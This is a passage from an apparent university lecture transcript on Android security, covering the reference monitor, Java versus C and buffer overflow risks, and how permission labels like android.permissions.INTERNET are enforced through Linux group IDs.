              <time_slice>37:55</time_slice>
              <text_slice>or, like, Assembly, or
don't require anything</text_slice>
            </slice>
            <slice>
              <time_slice>37:57</time_slice>
              <text_slice>at all for that matter.</text_slice>
            </slice>
            <slice>
              <time_slice>37:58</time_slice>
              <text_slice>Would anything break?</text_slice>
            </slice>
            <slice>
              <time_slice>37:59</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>38:00</time_slice>
              <text_slice>AUDIENCE: You have
vulnerabilities [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>38:02</time_slice>
              <text_slice>override these important values.</text_slice>
            </slice>
            <slice>
              <time_slice>38:03</time_slice>
              <text_slice>PROFESSOR: Uh-huh.</text_slice>
            </slice>
            <slice>
              <time_slice>38:04</time_slice>
              <text_slice>Yeah, it could be.</text_slice>
            </slice>
            <slice>
              <time_slice>38:05</time_slice>
              <text_slice>So like an app could have
some buffer overflow in it.</text_slice>
            </slice>
            <slice>
              <time_slice>38:08</time_slice>
              <text_slice>So how bad would that be?</text_slice>
            </slice>
            <slice>
              <time_slice>38:11</time_slice>
              <text_slice>AUDIENCE: It could
override with permissions.</text_slice>
            </slice>
            <slice>
              <time_slice>38:13</time_slice>
              <text_slice>PROFESSOR: Which permissions?</text_slice>
            </slice>
            <slice>
              <time_slice>38:15</time_slice>
              <text_slice>AUDIENCE: Like the latency.</text_slice>
            </slice>
            <slice>
              <time_slice>38:17</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>38:18</time_slice>
              <text_slice>Well, actually, let's see.</text_slice>
            </slice>
            <slice>
              <time_slice>38:19</time_slice>
              <text_slice>So as we were talking
about, the reference monitor</text_slice>
            </slice>
            <slice>
              <time_slice>38:22</time_slice>
              <text_slice>is the thing that does all
the label checking for us.</text_slice>
            </slice>
            <slice>
              <time_slice>38:25</time_slice>
              <text_slice>And the reference
monitor actually,</text_slice>
            </slice>
            <slice>
              <time_slice>38:26</time_slice>
              <text_slice>in Android, stores a list of
all the installed applications</text_slice>
            </slice>
            <slice>
              <time_slice>38:31</time_slice>
              <text_slice>along with the labels
that correspond</text_slice>
            </slice>
            <slice>
              <time_slice>38:33</time_slice>
              <text_slice>to all those applications.</text_slice>
            </slice>
            <slice>
              <time_slice>38:35</time_slice>
              <text_slice>So it's probably
true that you don't</text_slice>
            </slice>
            <slice>
              <time_slice>38:37</time_slice>
              <text_slice>want any kinds of bugs
in the reference monitor</text_slice>
            </slice>
            <slice>
              <time_slice>38:40</time_slice>
              <text_slice>regardless of what
language it's written in.</text_slice>
            </slice>
            <slice>
              <time_slice>38:42</time_slice>
              <text_slice>So having the
reference monitor being</text_slice>
            </slice>
            <slice>
              <time_slice>38:44</time_slice>
              <text_slice>written in a type-safe
language is probably</text_slice>
            </slice>
            <slice>
              <time_slice>38:45</time_slice>
              <text_slice>a good thing in general.</text_slice>
            </slice>
            <slice>
              <time_slice>38:46</time_slice>
              <text_slice>And I like Java.</text_slice>
            </slice>
            <slice>
              <time_slice>38:48</time_slice>
              <text_slice>I can sense that it's
a type-safe language</text_slice>
            </slice>
            <slice>
              <time_slice>38:50</time_slice>
              <text_slice>and has all these
nice properties.</text_slice>
            </slice>
            <slice>
              <time_slice>38:53</time_slice>
              <text_slice>But if an application
were to be written in C</text_slice>
            </slice>
            <slice>
              <time_slice>38:55</time_slice>
              <text_slice>and had a buffer
overflow, it wouldn't</text_slice>
            </slice>
            <slice>
              <time_slice>38:57</time_slice>
              <text_slice>be able to corrupt directly the
labels stored in the reference</text_slice>
            </slice>
            <slice>
              <time_slice>39:00</time_slice>
              <text_slice>monitor here.</text_slice>
            </slice>
            <slice>
              <time_slice>39:01</time_slice>
              <text_slice>So that wouldn't be
as big of a deal.</text_slice>
            </slice>
            <slice>
              <time_slice>39:03</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>39:04</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>39:08</time_slice>
              <text_slice>PROFESSOR: It could be.</text_slice>
            </slice>
            <slice>
              <time_slice>39:09</time_slice>
              <text_slice>So why would that be helpful?</text_slice>
            </slice>
            <slice>
              <time_slice>39:12</time_slice>
              <text_slice>AUDIENCE: There's some
system [INAUDIBLE] that it</text_slice>
            </slice>
            <slice>
              <time_slice>39:15</time_slice>
              <text_slice>can actually override C?</text_slice>
            </slice>
            <slice>
              <time_slice>39:18</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>39:19</time_slice>
              <text_slice>So in principle, it
might be nice to avoid</text_slice>
            </slice>
            <slice>
              <time_slice>39:21</time_slice>
              <text_slice>the applications talking
directly to the Linux kernel.</text_slice>
            </slice>
            <slice>
              <time_slice>39:23</time_slice>
              <text_slice>[INAUDIBLE] in Android,
this is not the case.</text_slice>
            </slice>
            <slice>
              <time_slice>39:25</time_slice>
              <text_slice>So actually,
Android applications</text_slice>
            </slice>
            <slice>
              <time_slice>39:26</time_slice>
              <text_slice>can make arbitrary system
calls if they want to.</text_slice>
            </slice>
            <slice>
              <time_slice>39:29</time_slice>
              <text_slice>And in fact,
applications I should say</text_slice>
            </slice>
            <slice>
              <time_slice>39:31</time_slice>
              <text_slice>can shift with
arbitrary components</text_slice>
            </slice>
            <slice>
              <time_slice>39:33</time_slice>
              <text_slice>written in C or Assembly
for performance reasons.</text_slice>
            </slice>
            <slice>
              <time_slice>39:35</time_slice>
              <text_slice>So some games [? shift ?] with
the computationally intensive</text_slice>
            </slice>
            <slice>
              <time_slice>39:39</time_slice>
              <text_slice>parts written in
C. And they sort of</text_slice>
            </slice>
            <slice>
              <time_slice>39:41</time_slice>
              <text_slice>talk to it from Java as well.</text_slice>
            </slice>
            <slice>
              <time_slice>39:44</time_slice>
              <text_slice>AUDIENCE: So I
guess part of it is</text_slice>
            </slice>
            <slice>
              <time_slice>39:45</time_slice>
              <text_slice>being able to use all
of the stuff that's</text_slice>
            </slice>
            <slice>
              <time_slice>39:47</time_slice>
              <text_slice>been written for Java.</text_slice>
            </slice>
            <slice>
              <time_slice>39:49</time_slice>
              <text_slice>They wanted to make
it easy to build</text_slice>
            </slice>
            <slice>
              <time_slice>39:51</time_slice>
              <text_slice>applications for developers.</text_slice>
            </slice>
            <slice>
              <time_slice>39:53</time_slice>
              <text_slice>And one of the easy
ways of doing that</text_slice>
            </slice>
            <slice>
              <time_slice>39:55</time_slice>
              <text_slice>is being able to take advantage
of the massive Java libraries</text_slice>
            </slice>
            <slice>
              <time_slice>39:57</time_slice>
              <text_slice>out there.</text_slice>
            </slice>
            <slice>
              <time_slice>39:58</time_slice>
              <text_slice>PROFESSOR: Mm-hm.</text_slice>
            </slice>
            <slice>
              <time_slice>39:59</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>39:59</time_slice>
              <text_slice>So I think one big reason for
using Java is the usability.</text_slice>
            </slice>
            <slice>
              <time_slice>40:02</time_slice>
              <text_slice>They wanted to-- I think Java
has little to do with security</text_slice>
            </slice>
            <slice>
              <time_slice>40:05</time_slice>
              <text_slice>and mostly with programmability,
ease of development.</text_slice>
            </slice>
            <slice>
              <time_slice>40:09</time_slice>
              <text_slice>One other thing that
I think is going on</text_slice>
            </slice>
            <slice>
              <time_slice>40:11</time_slice>
              <text_slice>is that-- well, to contrast
with iPhones, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>40:15</time_slice>
              <text_slice>iPhones also really want
ease of development.</text_slice>
            </slice>
            <slice>
              <time_slice>40:17</time_slice>
              <text_slice>But they use Objective C, which
has buffer overflows if you</text_slice>
            </slice>
            <slice>
              <time_slice>40:21</time_slice>
              <text_slice>try hard enough.</text_slice>
            </slice>
            <slice>
              <time_slice>40:22</time_slice>
              <text_slice>And it is specific to
a particular hardware.</text_slice>
            </slice>
            <slice>
              <time_slice>40:25</time_slice>
              <text_slice>It doesn't maybe have
all the same libraries.</text_slice>
            </slice>
            <slice>
              <time_slice>40:27</time_slice>
              <text_slice>I think the main reason
why the Android guys</text_slice>
            </slice>
            <slice>
              <time_slice>40:29</time_slice>
              <text_slice>went with Java is
probably the fact</text_slice>
            </slice>
            <slice>
              <time_slice>40:31</time_slice>
              <text_slice>that they weren't manufacturing
devices at the same time.</text_slice>
            </slice>
            <slice>
              <time_slice>40:34</time_slice>
              <text_slice>So the iPhones
knew exactly it was</text_slice>
            </slice>
            <slice>
              <time_slice>40:35</time_slice>
              <text_slice>going to be this ARM
processor running their phone.</text_slice>
            </slice>
            <slice>
              <time_slice>40:37</time_slice>
              <text_slice>So they could compile to
ARM and be done with it.</text_slice>
            </slice>
            <slice>
              <time_slice>40:40</time_slice>
              <text_slice>And it's more efficient,
because battery</text_slice>
            </slice>
            <slice>
              <time_slice>40:43</time_slice>
              <text_slice>matters a lot on a phone.</text_slice>
            </slice>
            <slice>
              <time_slice>40:45</time_slice>
              <text_slice>And the Android guys use Java,
which probably is slightly</text_slice>
            </slice>
            <slice>
              <time_slice>40:48</time_slice>
              <text_slice>less power-efficient or
CPU-efficient, because it</text_slice>
            </slice>
            <slice>
              <time_slice>40:51</time_slice>
              <text_slice>involves this JRE, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>40:53</time_slice>
              <text_slice>But the cool thing
about it, it's</text_slice>
            </slice>
            <slice>
              <time_slice>40:54</time_slice>
              <text_slice>actually portable
between architectures.</text_slice>
            </slice>
            <slice>
              <time_slice>40:56</time_slice>
              <text_slice>So if you have a phone that
has a MIPS processor, or an ARM</text_slice>
            </slice>
            <slice>
              <time_slice>40:58</time_slice>
              <text_slice>processor, or an x86
processor, the Java application</text_slice>
            </slice>
            <slice>
              <time_slice>41:02</time_slice>
              <text_slice>can be run on all three
of these kinds of devices.</text_slice>
            </slice>
            <slice>
              <time_slice>41:05</time_slice>
              <text_slice>And the Android guys
wanted their platform</text_slice>
            </slice>
            <slice>
              <time_slice>41:07</time_slice>
              <text_slice>to be usable on any kind
of hardware or phone.</text_slice>
            </slice>
            <slice>
              <time_slice>41:11</time_slice>
              <text_slice>So that's probably
one big reason</text_slice>
            </slice>
            <slice>
              <time_slice>41:13</time_slice>
              <text_slice>for why they use Java
in all these cases,</text_slice>
            </slice>
            <slice>
              <time_slice>41:15</time_slice>
              <text_slice>and probably less so in
terms of [? staying ?]</text_slice>
            </slice>
            <slice>
              <time_slice>41:18</time_slice>
              <text_slice>security consideration for Java.</text_slice>
            </slice>
            <slice>
              <time_slice>41:21</time_slice>
              <text_slice>So in fact, it turns out that
the Java runtime doesn't really</text_slice>
            </slice>
            <slice>
              <time_slice>41:24</time_slice>
              <text_slice>provide any security purpose
for the application and is just</text_slice>
            </slice>
            <slice>
              <time_slice>41:28</time_slice>
              <text_slice>sort of a nice
convenience thing,</text_slice>
            </slice>
            <slice>
              <time_slice>41:30</time_slice>
              <text_slice>as well as providing all the
abstractions that the developer</text_slice>
            </slice>
            <slice>
              <time_slice>41:33</time_slice>
              <text_slice>should think in terms of.</text_slice>
            </slice>
            <slice>
              <time_slice>41:34</time_slice>
              <text_slice>But in terms of
isolation, it's mostly</text_slice>
            </slice>
            <slice>
              <time_slice>41:36</time_slice>
              <text_slice>up to the kernel and
the reference monitor</text_slice>
            </slice>
            <slice>
              <time_slice>41:38</time_slice>
              <text_slice>to keep these guys in line.</text_slice>
            </slice>
            <slice>
              <time_slice>41:41</time_slice>
              <text_slice>That make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>41:43</time_slice>
              <text_slice>Any questions?</text_slice>
            </slice>
            <slice>
              <time_slice>41:45</time_slice>
              <text_slice>AUDIENCE: Doesn't the
ease of development also</text_slice>
            </slice>
            <slice>
              <time_slice>41:47</time_slice>
              <text_slice>kind of translate into
some security [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>41:49</time_slice>
              <text_slice>Because if you write that
reference monitor in C,</text_slice>
            </slice>
            <slice>
              <time_slice>41:52</time_slice>
              <text_slice>I can see much more
ways to make a mistake.</text_slice>
            </slice>
            <slice>
              <time_slice>41:54</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>41:55</time_slice>
              <text_slice>So you're absolutely right.</text_slice>
            </slice>
            <slice>
              <time_slice>41:57</time_slice>
              <text_slice>Actually, I shouldn't have
said that ease of development</text_slice>
            </slice>
            <slice>
              <time_slice>42:00</time_slice>
              <text_slice>has nothing to do with security.</text_slice>
            </slice>
            <slice>
              <time_slice>42:01</time_slice>
              <text_slice>This is completely
silly, because you</text_slice>
            </slice>
            <slice>
              <time_slice>42:03</time_slice>
              <text_slice>want to make it as easy as
possible to write correct code.</text_slice>
            </slice>
            <slice>
              <time_slice>42:07</time_slice>
              <text_slice>And it's all about
covering mistakes.</text_slice>
            </slice>
            <slice>
              <time_slice>42:08</time_slice>
              <text_slice>So in some ways,
having a system where</text_slice>
            </slice>
            <slice>
              <time_slice>42:12</time_slice>
              <text_slice>it's easy to write correct code
is the most important security</text_slice>
            </slice>
            <slice>
              <time_slice>42:15</time_slice>
              <text_slice>consideration to have.</text_slice>
            </slice>
            <slice>
              <time_slice>42:16</time_slice>
              <text_slice>So in some sense, you're
right, that it avoids the bugs.</text_slice>
            </slice>
            <slice>
              <time_slice>42:20</time_slice>
              <text_slice>But you don't want your
application written in C.</text_slice>
            </slice>
            <slice>
              <time_slice>42:22</time_slice>
              <text_slice>Or I don't know why Apple has
Objective C. It's actually</text_slice>
            </slice>
            <slice>
              <time_slice>42:25</time_slice>
              <text_slice>a little bit of a
problem in this regard,</text_slice>
            </slice>
            <slice>
              <time_slice>42:26</time_slice>
              <text_slice>because you could
easily have buffer</text_slice>
            </slice>
            <slice>
              <time_slice>42:27</time_slice>
              <text_slice>overflows in your application.</text_slice>
            </slice>
            <slice>
              <time_slice>42:28</time_slice>
              <text_slice>And if that application
matters a lot,</text_slice>
            </slice>
            <slice>
              <time_slice>42:31</time_slice>
              <text_slice>then it's vulnerable
potentially.</text_slice>
            </slice>
            <slice>
              <time_slice>42:33</time_slice>
              <text_slice>Not with respect to compromising
other applications, but you're</text_slice>
            </slice>
            <slice>
              <time_slice>42:36</time_slice>
              <text_slice>[? all like, ?] bank
app, I don't want</text_slice>
            </slice>
            <slice>
              <time_slice>42:38</time_slice>
              <text_slice>that bank app written in C.</text_slice>
            </slice>
            <slice>
              <time_slice>42:39</time_slice>
              <text_slice>AUDIENCE: Right.</text_slice>
            </slice>
            <slice>
              <time_slice>42:40</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>42:40</time_slice>
              <text_slice>AUDIENCE: Is the reference
monitor written in Java or C?</text_slice>
            </slice>
            <slice>
              <time_slice>42:44</time_slice>
              <text_slice>PROFESSOR: So in Android, the
reference monitor is largely</text_slice>
            </slice>
            <slice>
              <time_slice>42:46</time_slice>
              <text_slice>written in Java, yes.</text_slice>
            </slice>
            <slice>
              <time_slice>42:47</time_slice>
              <text_slice>There are some native hooks
that it needs in order</text_slice>
            </slice>
            <slice>
              <time_slice>42:50</time_slice>
              <text_slice>to be able to talk to these
intent interface-- pipes,</text_slice>
            </slice>
            <slice>
              <time_slice>42:53</time_slice>
              <text_slice>basically, to talk
to the binder,</text_slice>
            </slice>
            <slice>
              <time_slice>42:54</time_slice>
              <text_slice>they need some native code.</text_slice>
            </slice>
            <slice>
              <time_slice>42:56</time_slice>
              <text_slice>They need some native code
to spawn these applications</text_slice>
            </slice>
            <slice>
              <time_slice>42:58</time_slice>
              <text_slice>in the first place, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>42:59</time_slice>
              <text_slice>But by and large, most of
the logic is written in Java.</text_slice>
            </slice>
            <slice>
              <time_slice>43:02</time_slice>
              <text_slice>So it's actually a reasonably
safe plan, I think.</text_slice>
            </slice>
            <slice>
              <time_slice>43:06</time_slice>
              <text_slice>Any other questions about this?</text_slice>
            </slice>
            <slice>
              <time_slice>43:10</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>43:11</time_slice>
              <text_slice>So I guess let's try to figure
out what are these application</text_slice>
            </slice>
            <slice>
              <time_slice>43:16</time_slice>
              <text_slice>UIDs used for other than
to keep applications</text_slice>
            </slice>
            <slice>
              <time_slice>43:19</time_slice>
              <text_slice>separate from another in
terms of their processes?</text_slice>
            </slice>
            <slice>
              <time_slice>43:22</time_slice>
              <text_slice>So I guess the main
thing that applications</text_slice>
            </slice>
            <slice>
              <time_slice>43:24</time_slice>
              <text_slice>need to use the UID for or
that we need to somehow support</text_slice>
            </slice>
            <slice>
              <time_slice>43:29</time_slice>
              <text_slice>is the ability to share access
to shared resources and shared</text_slice>
            </slice>
            <slice>
              <time_slice>43:33</time_slice>
              <text_slice>data in the system.</text_slice>
            </slice>
            <slice>
              <time_slice>43:35</time_slice>
              <text_slice>And we already saw one
mechanism for doing it,</text_slice>
            </slice>
            <slice>
              <time_slice>43:37</time_slice>
              <text_slice>which is to send intents
to the reference monitor.</text_slice>
            </slice>
            <slice>
              <time_slice>43:40</time_slice>
              <text_slice>But there's a bunch of things
that, in Android, are not</text_slice>
            </slice>
            <slice>
              <time_slice>43:44</time_slice>
              <text_slice>done through intents to
the reference monitor.</text_slice>
            </slice>
            <slice>
              <time_slice>43:48</time_slice>
              <text_slice>And they have to do
probably with performance,</text_slice>
            </slice>
            <slice>
              <time_slice>43:51</time_slice>
              <text_slice>or why-- basically, why isn't
everything sent through intents</text_slice>
            </slice>
            <slice>
              <time_slice>43:54</time_slice>
              <text_slice>is probably because there
are some performance</text_slice>
            </slice>
            <slice>
              <time_slice>43:56</time_slice>
              <text_slice>considerations.</text_slice>
            </slice>
            <slice>
              <time_slice>43:57</time_slice>
              <text_slice>You don't want to
invoke the reference</text_slice>
            </slice>
            <slice>
              <time_slice>43:59</time_slice>
              <text_slice>monitor in every single
thing you do in the system.</text_slice>
            </slice>
            <slice>
              <time_slice>44:02</time_slice>
              <text_slice>And there's a couple of things
that an Android are like this.</text_slice>
            </slice>
            <slice>
              <time_slice>44:05</time_slice>
              <text_slice>The simplest one is
probably network access.</text_slice>
            </slice>
            <slice>
              <time_slice>44:10</time_slice>
              <text_slice>So if you want to
talk to the internet,</text_slice>
            </slice>
            <slice>
              <time_slice>44:11</time_slice>
              <text_slice>you just open a
socket, very much</text_slice>
            </slice>
            <slice>
              <time_slice>44:14</time_slice>
              <text_slice>like you would on a standard
Linux application today.</text_slice>
            </slice>
            <slice>
              <time_slice>44:17</time_slice>
              <text_slice>The application can just ask
the kernel, I want a socket,</text_slice>
            </slice>
            <slice>
              <time_slice>44:19</time_slice>
              <text_slice>I want to connect
to this machine.</text_slice>
            </slice>
            <slice>
              <time_slice>44:21</time_slice>
              <text_slice>Go for it.</text_slice>
            </slice>
            <slice>
              <time_slice>44:22</time_slice>
              <text_slice>So network access
happens to work this way.</text_slice>
            </slice>
            <slice>
              <time_slice>44:26</time_slice>
              <text_slice>Access to removable storage.</text_slice>
            </slice>
            <slice>
              <time_slice>44:28</time_slice>
              <text_slice>So if you have an SD
card in your phone,</text_slice>
            </slice>
            <slice>
              <time_slice>44:30</time_slice>
              <text_slice>that also directly goes
through the kernel.</text_slice>
            </slice>
            <slice>
              <time_slice>44:33</time_slice>
              <text_slice>Or more generally, any
kind of file system access</text_slice>
            </slice>
            <slice>
              <time_slice>44:37</time_slice>
              <text_slice>or direct access to the
file system, at least,</text_slice>
            </slice>
            <slice>
              <time_slice>44:40</time_slice>
              <text_slice>goes directly
through the kernel,</text_slice>
            </slice>
            <slice>
              <time_slice>44:41</time_slice>
              <text_slice>because there is already
a file system there.</text_slice>
            </slice>
            <slice>
              <time_slice>44:43</time_slice>
              <text_slice>And you want to avoid probably
[INAUDIBLE] performance</text_slice>
            </slice>
            <slice>
              <time_slice>44:45</time_slice>
              <text_slice>overheads on that.</text_slice>
            </slice>
            <slice>
              <time_slice>44:48</time_slice>
              <text_slice>And also, for most
devices that are hardware,</text_slice>
            </slice>
            <slice>
              <time_slice>44:54</time_slice>
              <text_slice>Android allows the application
to directly talk to the device</text_slice>
            </slice>
            <slice>
              <time_slice>44:58</time_slice>
              <text_slice>instead of mediating the access
through the reference monitor.</text_slice>
            </slice>
            <slice>
              <time_slice>45:02</time_slice>
              <text_slice>So this is things like probably
your camera, your GPS device,</text_slice>
            </slice>
            <slice>
              <time_slice>45:07</time_slice>
              <text_slice>compass, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>45:08</time_slice>
              <text_slice>And these guys just show up in
Android in Linux as something</text_slice>
            </slice>
            <slice>
              <time_slice>45:12</time_slice>
              <text_slice>like /dev/camera.</text_slice>
            </slice>
            <slice>
              <time_slice>45:15</time_slice>
              <text_slice>And this is just
a Linux device you</text_slice>
            </slice>
            <slice>
              <time_slice>45:18</time_slice>
              <text_slice>could open, and get the
camera data out, and control</text_slice>
            </slice>
            <slice>
              <time_slice>45:21</time_slice>
              <text_slice>the camera in whatever
ways you want, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>45:23</time_slice>
              <text_slice>And the cool thing is that if
you want to do some specialized</text_slice>
            </slice>
            <slice>
              <time_slice>45:26</time_slice>
              <text_slice>things to this device,
you're not restricted</text_slice>
            </slice>
            <slice>
              <time_slice>45:29</time_slice>
              <text_slice>to what Java allows you to do.</text_slice>
            </slice>
            <slice>
              <time_slice>45:31</time_slice>
              <text_slice>You can always
write C code or even</text_slice>
            </slice>
            <slice>
              <time_slice>45:33</time_slice>
              <text_slice>Assembly that directly
talks to the kernel</text_slice>
            </slice>
            <slice>
              <time_slice>45:35</time_slice>
              <text_slice>and performs the necessary
operations on this Linux</text_slice>
            </slice>
            <slice>
              <time_slice>45:38</time_slice>
              <text_slice>device, making
arbitrary system calls.</text_slice>
            </slice>
            <slice>
              <time_slice>45:41</time_slice>
              <text_slice>And you could wrap this up
in a Java native interface</text_slice>
            </slice>
            <slice>
              <time_slice>45:45</time_slice>
              <text_slice>to expose it to the rest of your
Java-based application here.</text_slice>
            </slice>
            <slice>
              <time_slice>45:49</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>45:49</time_slice>
              <text_slice>AUDIENCE: But you still have the
checks in these calls, right?</text_slice>
            </slice>
            <slice>
              <time_slice>45:52</time_slice>
              <text_slice>So when you open
a socket, someone</text_slice>
            </slice>
            <slice>
              <time_slice>45:54</time_slice>
              <text_slice>has to check if they're allowed
to open a socket [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>45:56</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>45:57</time_slice>
              <text_slice>So this is an interesting thing.</text_slice>
            </slice>
            <slice>
              <time_slice>45:58</time_slice>
              <text_slice>Now these things are outside
our intent-based model.</text_slice>
            </slice>
            <slice>
              <time_slice>46:01</time_slice>
              <text_slice>So how are we going
to protect these guys?</text_slice>
            </slice>
            <slice>
              <time_slice>46:03</time_slice>
              <text_slice>So this sort of boils
down to doing something</text_slice>
            </slice>
            <slice>
              <time_slice>46:06</time_slice>
              <text_slice>very similar to
what you guys did</text_slice>
            </slice>
            <slice>
              <time_slice>46:07</time_slice>
              <text_slice>in Lab 2, which is
you [INAUDIBLE] you</text_slice>
            </slice>
            <slice>
              <time_slice>46:10</time_slice>
              <text_slice>want to enforce it using UIDs.</text_slice>
            </slice>
            <slice>
              <time_slice>46:13</time_slice>
              <text_slice>Basically, the
Android framework is</text_slice>
            </slice>
            <slice>
              <time_slice>46:15</time_slice>
              <text_slice>responsible for carefully
orchestrating the UIDs and GIDs</text_slice>
            </slice>
            <slice>
              <time_slice>46:19</time_slice>
              <text_slice>of the applications
and of these things</text_slice>
            </slice>
            <slice>
              <time_slice>46:22</time_slice>
              <text_slice>to enforce whatever policy was
specified in terms of labels.</text_slice>
            </slice>
            <slice>
              <time_slice>46:28</time_slice>
              <text_slice>So the way this works
out is that for every one</text_slice>
            </slice>
            <slice>
              <time_slice>46:31</time_slice>
              <text_slice>of these resources, there
is a pre-defined label</text_slice>
            </slice>
            <slice>
              <time_slice>46:35</time_slice>
              <text_slice>string that defines
the privilege</text_slice>
            </slice>
            <slice>
              <time_slice>46:39</time_slice>
              <text_slice>to access this resource.</text_slice>
            </slice>
            <slice>
              <time_slice>46:40</time_slice>
              <text_slice>So for this network
access thing,</text_slice>
            </slice>
            <slice>
              <time_slice>46:41</time_slice>
              <text_slice>for example, I think
there's a string, something</text_slice>
            </slice>
            <slice>
              <time_slice>46:45</time_slice>
              <text_slice>like
android.permissions.INTERNET.</text_slice>
            </slice>
            <slice>
              <time_slice>46:55</time_slice>
              <text_slice>So this is a label that an
application can ask for.</text_slice>
            </slice>
            <slice>
              <time_slice>47:00</time_slice>
              <text_slice>And if an application has this
label in its set of privileges,</text_slice>
            </slice>
            <slice>
              <time_slice>47:06</time_slice>
              <text_slice>then it should be able
to access the network.</text_slice>
            </slice>
            <slice>
              <time_slice>47:08</time_slice>
              <text_slice>And the way this is
enforced-- so the label</text_slice>
            </slice>
            <slice>
              <time_slice>47:10</time_slice>
              <text_slice>is the policy side of this.</text_slice>
            </slice>
            <slice>
              <time_slice>47:12</time_slice>
              <text_slice>How do you specify
what should happen?</text_slice>
            </slice>
            <slice>
              <time_slice>47:14</time_slice>
              <text_slice>And the enforcement
mechanism is a small change</text_slice>
            </slice>
            <slice>
              <time_slice>47:17</time_slice>
              <text_slice>to the Linux kernel in
Android, where in order</text_slice>
            </slice>
            <slice>
              <time_slice>47:20</time_slice>
              <text_slice>to make any network-related
system calls,</text_slice>
            </slice>
            <slice>
              <time_slice>47:23</time_slice>
              <text_slice>you have to be a member
of some magic group.</text_slice>
            </slice>
            <slice>
              <time_slice>47:25</time_slice>
              <text_slice>This is not at all how things
work in Linux traditionally.</text_slice>
            </slice>
            <slice>
              <time_slice>47:28</time_slice>
              <text_slice>But in Android, there is
some magic group [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>47:31</time_slice>
              <text_slice>I think it's GID 3003.</text_slice>
            </slice>
            <slice>
              <time_slice>47:35</time_slice>
              <text_slice>And the kernel has this
number hard-coded in it.</text_slice>
            </slice>
            <slice>
              <time_slice>47:38</time_slice>
              <text_slice>And if the process has this
group ID in its group list,</text_slice>
            </slice>
            <slice>
              <time_slice>47:45</time_slice>
              <text_slice>then it's allowed to use a
network-related system call.</text_slice>
            </slice>
            <slice>
              <time_slice>47:48</time_slice>
              <text_slice>And if it doesn't have this
group ID in its group list,</text_slice>
            </slice>
            <slice>
              <time_slice>47:50</time_slice>
              <text_slice>then it's not allowed to make
any network-related system</text_slice>
            </slice>
            <slice>
              <time_slice>47:53</time_slice>
              <text_slice>calls at all.</text_slice>
            </slice>
            <slice>
              <time_slice>47:53</time_slice>
              <text_slice>So this is how Android is able
to translate these label--</text_slice>
            </slice>
            <slice>
              <time_slice>47:58</time_slice>
              <text_slice>sort of maintain a single,
coherent policy system that's</text_slice>
            </slice>
            <slice>
              <time_slice>48:02</time_slice>
              <text_slice>in terms of these label
screens, but enforce it</text_slice>
            </slice>
            <slice>
              <time_slice>48:05</time_slice>
              <text_slice>in different ways.</text_slice>
            </slice>
            <slice>
              <time_slice>48:06</time_slice>
              <text_slice>So sometimes it gets enforced
by the reference monitor.</text_slice>
            </slice>
            <slice>
              <time_slice>48:09</time_slice>
              <text_slice>And other times,
it gets enforced</text_slice>
            </slice>
            <slice>
              <time_slice>48:11</time_slice>
              <text_slice>by setting GIDs or
UIDs appropriately.</text_slice>
            </slice>
            <slice>
              <time_slice>48:15</time_slice>
              <text_slice>The same thing actually
happens with SD cards.</text_slice>
            </slice>
            <slice>
              <time_slice>48:16</time_slice>
              <text_slice>There's another GID that
corresponds to having access</text_slice>
            </slice>
            <slice>
              <time_slice>48:20</time_slice>
              <text_slice>with the SD card.</text_slice>
            </slice>
            <slice>
              <time_slice>48:21</time_slice>
              <text_slice>And there's a string that
gets translated into this GID,</text_slice>
            </slice>
            <slice>
              <time_slice>48:24</time_slice>
              <text_slice>effectively.</text_slice>
            </slice>
            <slice>
              <time_slice>48:25</time_slice>
              <text_slice>And same for the file system.</text_slice>
            </slice>
            <slice>
              <time_slice>48:27</time_slice>
              <text_slice>I guess in the
file system, things</text_slice>
            </slice>
            <slice>
              <time_slice>48:29</time_slice>
              <text_slice>are a little bit trickier.</text_slice>
            </slice>
            <slice>
              <time_slice>48:30</time_slice>
              <text_slice>I guess the SD card
is in the file system</text_slice>
            </slice>
            <slice>
              <time_slice>48:32</time_slice>
              <text_slice>and has a specific GID for
accessing the entire SD card.</text_slice>
            </slice>
            <slice>
              <time_slice>48:36</time_slice>
              <text_slice>Another sort of other files
in the phone's file system--</text_slice>
            </slice>
            <slice>
              <time_slice>48:42</time_slice>
              <text_slice>there, the policy isn't
so much controlled</text_slice>
            </slice>
            <slice>
              <time_slice>48:45</time_slice>
              <text_slice>by labels, but rather
by Android's design,</text_slice>
            </slice>
            <slice>
              <time_slice>48:49</time_slice>
              <text_slice>which is that each application
has a private directory</text_slice>
            </slice>
            <slice>
              <time_slice>48:52</time_slice>
              <text_slice>that it can use to store
whatever files it wants.</text_slice>
            </slice>
            <slice>
              <time_slice>48:55</time_slice>
              <text_slice>And in particular,
the content provider,</text_slice>
            </slice>
            <slice>
              <time_slice>48:57</time_slice>
              <text_slice>the SQL database that you're
going to use as an application,</text_slice>
            </slice>
            <slice>
              <time_slice>49:00</time_slice>
              <text_slice>is stored in your
private directory.</text_slice>
            </slice>
            <slice>
              <time_slice>49:03</time_slice>
              <text_slice>And the policy is only the
application's UID can access</text_slice>
            </slice>
